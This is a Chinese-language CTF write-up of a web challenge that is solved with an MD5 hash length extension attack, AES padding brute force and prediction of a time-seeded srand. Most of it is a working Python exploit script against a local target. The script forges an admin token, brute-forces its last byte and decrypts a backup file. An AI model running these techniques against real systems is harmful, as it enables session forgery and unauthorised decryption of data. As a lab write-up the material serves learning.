本题考查的还是hash长度拓展攻击，以及aes加密方式

主要分析其中的验证部分如果想解密，就必须使得admin为1
admin的验证首先是需要解密的然后数组划分
前后hash值要相同，所以首先hash append然后要拿数据去加密
加密只有在登录的时候会生成token所以，又因为会aes所以会有填充，所以最后一位要爆破

所以写个脚本就可以跑出admin为1的token，拿着token去登录就可以实现解密

解密的时候发现srand是伪随机，可以预测生成的随机数

下面贴上解密脚本,脚本是从生成admin token开始的

```
#coding:utf-8
import requests
import time
import re
url_register = 'http://127.0.0.1/var/index.php?action=register'
url_login = 'http://127.0.0.1/var/index.php?action=login'
url_manage = 'http://127.0.0.1/var/index.php?action=manage'
url_back = 'http://127.0.0.1/var/backup_old.php'
re1 = requests.session()
def register(name,passwd):
    data = {
    'user':name,
    'pwd':passwd
    }
    re1.post(url_register,data=data)

# login('kk','kk')
def login(name,passwd):
    data = {
    'user':name,
    'pwd':passwd
    }
    s = re1.post(url_login,data=data,allow_redirects=False)
    # print s.content
    return  s.cookies

token_fl = ''
def attack(token,sign):
    global token_fl
    
    cookies ={
    'sign':sign,
    'token':token,
    }

    s = re1.post(url_manage,data={'do':'decrypt'},cookies=cookies)
    if 'Password' not in s.content:
        token_fl = token
        

def test(token,sign):
    re1.post(url_back)
    srand = int(time.time())
    r = re1.post('http://127.0.0.1/var/backup.txt')
    encrypt = r.content
    r = re1.post('http://127.0.0.1/2.php',data={'a':srand})
    st = r.content
    string = ''.join([hex(ord(i))[2:] for i in st])
    print st,string
    cookies ={
    'sign':sign,
    'token':token,
    }
    s = re1.post(url_manage,data={'do':'decrypt','iv':string,'text':encrypt},cookies=cookies)
    print s.content
    r = re.findall('(.{32,32})<br />',s.content)
    print ''.join([chr(int('0x'+r[0][i]+r[0][i+1],16)) for i in range(0,len(r[0]),2)])

hash_ex = 'e825bd41831d87fa7e8b84b5e6614ce5'
name = 'admin'+'\x80'+'\x00'*40+'\x78'+'\x00'*7+'tadmin'+'|1|'+hash_ex


passwd = '33'
# register(name,passwd)
rs = login(name,passwd)
print rs['sign'],len(rs['token'][:190])
# print rs['token'][:190]
dic = []
s = '0987654321abcdef'
for i in s:
    for j in s:
        dic.append(i+j)


for i in dic:
    attack(rs['token'][:190]+i,hash_ex)

# print token_fl
test(token_fl,hash_ex)

```